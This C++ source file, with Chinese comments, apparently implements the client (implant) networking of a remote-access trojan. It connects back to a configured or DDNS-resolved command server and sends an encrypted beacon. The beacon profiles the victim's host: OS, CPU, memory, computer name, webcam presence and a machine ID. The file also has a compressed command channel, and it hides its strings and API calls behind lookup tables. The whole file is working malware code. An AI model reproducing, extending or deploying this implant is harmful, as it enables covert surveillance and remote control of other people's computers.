// MyTrans.cpp: implementation of the CMyClientTran class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyClientTran.h"
#include "lzw.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyClientTran::CMyClientTran()
{
	m_Socket = NULL;
	m_IsProxy = FALSE;
	m_gFunc.memset(m_Addr, 0, MAX_PATH);
	m_Port = 0;
}

CMyClientTran::~CMyClientTran()
{
	Close();
}

SOCKET CMyClientTran::GetSafeSocket()
{
	return m_Socket;
}

BOOL CMyClientTran::Create(DWORD nCmd, HWND hWnd)
{
	Close();

	m_gFunc.strcpy(m_Addr, m_DllInfo.m_ServerAddr);
	m_Port = m_DllInfo.m_ServerPort;

	//查看是否有ddns
	if(m_gFunc.strlen(m_DllInfo.m_DdnsUrl) != 0)
	{
		GetRealServerInfo(m_DllInfo.m_DdnsUrl);
	}

	//连接到服务器
	m_Socket = GetConnectSocket(m_Addr, m_Port);
	if(m_Socket == NULL)
	{
		return FALSE;
	}
	
	//协商初始数据
	LOGININFO m_LoginInfo = {0};
	m_LoginInfo.m_Cmd = nCmd;
	m_LoginInfo.m_hWnd = (HWND) hWnd;
	m_LoginInfo.m_UserId = PS_USER_ID;
	FillMySysInfo(&m_LoginInfo, &m_DllInfo);
	MyMainFunc::EncryptByte(&m_LoginInfo, sizeof(LOGININFO));
	return SendData(&m_LoginInfo, sizeof(LOGININFO));
}

BOOL CMyClientTran::GetRealServerInfo(LPCTSTR m_DdnsUrl)
{
	//http://%s
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10203, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	char m_Url[1024] = {0};
	m_gFunc.sprintf(m_Url, m_TmpStr, m_DdnsUrl);
	
	char m_FileName[MAX_PATH] = {0};
	m_gFunc.GetTempPath(250, m_FileName);

	//%08x.txt
	m_gFunc.GetMyString(10204, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.sprintf(m_FileName + m_gFunc.strlen(m_FileName), m_TmpStr, m_gFunc.GetCurrentThreadId());
	if(!MyMainFunc::GetUrlFile(m_Url, m_FileName))
	{
		return FALSE;
	}

	HANDLE hFile = m_gFunc.CreateFile(m_FileName, GENERIC_READ, FILE_SHARE_READ,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nReadLen = 0;
	DWORD nFileLen = m_gFunc.GetFileSize(hFile, NULL);
	char* pFileBuf = new char[nFileLen];
	m_gFunc.ReadFile(hFile, pFileBuf, nFileLen, &nReadLen, NULL);
	m_gFunc.CloseHandle(hFile);
	m_gFunc.DeleteFile(m_FileName);

	//取掉末尾
	char* pDot = m_gFunc.strchr(pFileBuf , '\r');
	if(pDot != NULL)
	{
		*pDot = 0;
	}
	pDot = m_gFunc.strchr(pFileBuf , '\n');
	if(pDot != NULL)
	{
		*pDot = 0;
	}

	pDot = m_gFunc.strchr(pFileBuf , ':');
	if(pDot == NULL) 
	{
		m_gFunc.strcpy(m_Addr, pFileBuf);
		m_Port = 80;
		delete [] pFileBuf;
		return TRUE;
	}

	*pDot = 0;
	m_gFunc.strcpy(m_Addr, pFileBuf);
	m_Port = m_gFunc.atoi(pDot + 1);
	delete [] pFileBuf;
	return TRUE;
}

void CMyClientTran::Close()
{
	if(m_Socket != NULL)
	{
		closesocket(m_Socket);
		m_Socket = NULL;
	}
}

BOOL CMyClientTran::SendDataWithCmd(LPVOID pSendData, DWORD dSendLen, DWORD nCmd)
{
	BYTE* pZipData = NULL;
	if(pSendData != NULL && dSendLen != 0)
	{
		pZipData = new BYTE[dSendLen * 2 + 65535];
		m_gFunc.memset(pZipData, 0, dSendLen * 2 + 65535);
		FCLzw lzw;
		lzw.PcZip((BYTE*) pSendData, (BYTE*) pZipData, &dSendLen);
	}
	else
	{
		pZipData = (BYTE*) pSendData;
	}

	//发送包头
	if(!SendData(&dSendLen, sizeof(DWORD)))
	{
		if(pZipData != NULL && pZipData != pSendData)
		{
			delete [] pZipData;
		}
		return FALSE;
	}

	//发送命令
	if(!SendData(&nCmd, sizeof(DWORD)))
	{
		if(pZipData != NULL && pZipData != pSendData)
		{
			delete [] pZipData;
		}
		return FALSE;
	}

	if(dSendLen == 0)
	{
		return TRUE;
	}

	BOOL bRet = SendData(pZipData, dSendLen);
	if(pZipData != NULL && pZipData != pSendData)
	{
		delete [] pZipData;
	}
	return bRet;
}

BOOL CMyClientTran::RecvDataWithCmd(LPBYTE* pRecvData, DWORD* dRecvLen, DWORD* dCmd)
{
	//接收包头
	DWORD dZipLen = 0;
	if(!RecvData(&dZipLen, sizeof(DWORD)))
	{
		return FALSE;
	}

	//接收命令
	if(!RecvData(dCmd, sizeof(DWORD)))
	{
		return FALSE;
	}

	if(dZipLen == 0)
	{
		*dRecvLen = 0;
		return TRUE;
	}

	//接收包数据
	BYTE* pZipData = new BYTE[dZipLen];
	if(!RecvData(pZipData, dZipLen))
	{
		delete [] pZipData;
		return FALSE;
	}

	FCLzw lzw;
	BYTE* pData = NULL;
	lzw.PcUnZip(pZipData, &pData, dRecvLen);
	delete [] pZipData;
	*pRecvData = pData;
	return TRUE;
}


void CMyClientTran::FillMySysInfo(LPLOGININFO pSysInfo, LPPSDLLINFO pDllInfo)
{
//	_asm int 3;
	//取操作系统
	pSysInfo->m_SysType = IsShellSysType();

	//取CPU信息
	SYSTEM_INFO	m_pSysInfo = {0};
	m_gFunc.GetSystemInfo(&m_pSysInfo);
	pSysInfo->m_CpuSpeed = CPU_Frequency();
	pSysInfo->m_CpuCount = (UINT) m_pSysInfo.dwNumberOfProcessors;
	
	//取内存容量
	MEMORYSTATUSEX Buffer = {0};
	Buffer.dwLength = sizeof(Buffer);
	m_gFunc.GlobalMemoryStatusEx(&Buffer);
	pSysInfo->m_MemContent = Buffer.ullTotalPhys;

	//取计算机名
	DWORD m_Len = 16;
	m_gFunc.GetComputerName(pSysInfo->m_PcName, &m_Len);

	if(pSysInfo->m_Cmd == WM_CONNECT_MAIN)
	{
		//是否有摄像头
		pSysInfo->m_IsVideo = GetVideoInfo();
	}

	//计算机注释
	m_gFunc.strcpy(pSysInfo->m_Note, pDllInfo->m_Title);

	//计算机唯一标识
	m_gFunc.memcpy(pSysInfo->m_Id, pDllInfo->m_ID, 16);

	//用户分组
	m_gFunc.strcpy(pSysInfo->m_Group, pDllInfo->m_Group);

	//软件版本
	m_gFunc.strcpy(pSysInfo->m_SoftVer, pDllInfo->m_SoftVer);

	pSysInfo->m_ACP = m_gFunc.GetACP();
	pSysInfo->m_OEMCP = m_gFunc.GetOEMCP();
}

SOCKET CMyClientTran::GetConnectSocket(LPCTSTR pServerAddr, UINT nServerPort)
{
	struct sockaddr_in	m_ServerAddr = {0}; 
	int			m_AddrLen = sizeof(struct sockaddr_in);
	SOCKET		m_Socket = 0;

	char m_sServerIp[MAX_PATH] = {0};
	m_gFunc.strcpy(m_sServerIp, pServerAddr);
	DWORD dIp = inet_addr(m_sServerIp);
	if(dIp == INADDR_NONE)
	{
		PHOSTENT hostinfo = gethostbyname(m_sServerIp);
		if(hostinfo == NULL)
		{
			return NULL;
		}
		struct sockaddr_in dest = {0};
		m_gFunc.memcpy(&(dest.sin_addr), hostinfo->h_addr_list[0], hostinfo->h_length);
		m_gFunc.strcpy(m_sServerIp, inet_ntoa(dest.sin_addr));
	}

	//初始化连接信息
	m_ServerAddr.sin_addr.S_un.S_addr = inet_addr(m_sServerIp);
	m_ServerAddr.sin_port = htons(nServerPort); 
	m_ServerAddr.sin_family = AF_INET;

	//创建发送套接字
	m_Socket = socket(AF_INET, SOCK_STREAM, 0);
	if(m_Socket == INVALID_SOCKET)
	{
		return NULL;
	}
	
	//连接客户计算机
	if(connect(m_Socket, (sockaddr*)& m_ServerAddr, m_AddrLen) == SOCKET_ERROR) 
	{ 
		closesocket(m_Socket); 
		return NULL;
	}

	BOOL nodelayval = TRUE;
	if (setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, (const char *) &nodelayval, sizeof(BOOL)))
	{
		closesocket(m_Socket); 
		return NULL;
	}

	int one = 1;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	one = 3000 * 1000;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_RCVTIMEO, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	one = 3000 * 1000;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_SNDTIMEO, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	//连接成功
	return m_Socket;
}

Type CMyClientTran::IsShellSysType()
{
	Type ShellType = WindowsNT4;
	OSVERSIONINFO osvi = {0};
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	DWORD winVer = m_gFunc.GetVersion();
 	if(winVer < 0x80000000)
	{
		m_gFunc.GetVersionEx(&osvi);
		if(osvi.dwMajorVersion == 4L && osvi.dwMinorVersion == 0L)
		{
			ShellType = WindowsNT4;
		}
		else if(osvi.dwMajorVersion == 5L && osvi.dwMinorVersion == 0L)
		{
			ShellType = Windows2000;
		}
		else if(osvi.dwMajorVersion == 5L && osvi.dwMinorVersion == 1L)
		{
			ShellType = WindowsXP;
		}
		else if((osvi.dwMajorVersion == 5L && osvi.dwMinorVersion == 2L))
		{
			ShellType = Windows2003;
		}
		else if((osvi.dwMajorVersion == 6L && osvi.dwMinorVersion == 0L))
		{
			ShellType = Vista;
		}
		else if((osvi.dwMajorVersion == 6L && osvi.dwMinorVersion == 1L))
		{
			ShellType = Windows7;
		}
		else
		{
			ShellType = Windows8;
		}
	}
	else
	{
		ShellType = Windows98;
	}
	return ShellType;
}

int CMyClientTran::CPU_Frequency(void)
{
	//HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0
	char m_KeyName[256] = {0};
	m_gFunc.GetMyString(10259, m_KeyName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//~MHz
	char m_ValueName[256] = {0};
	m_gFunc.GetMyString(10260, m_ValueName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	DWORD nMz = 0;
	MyMainFunc::MyGetKeyStr(HKEY_LOCAL_MACHINE, m_KeyName, m_ValueName, (BYTE*) &nMz);
	return nMz;
}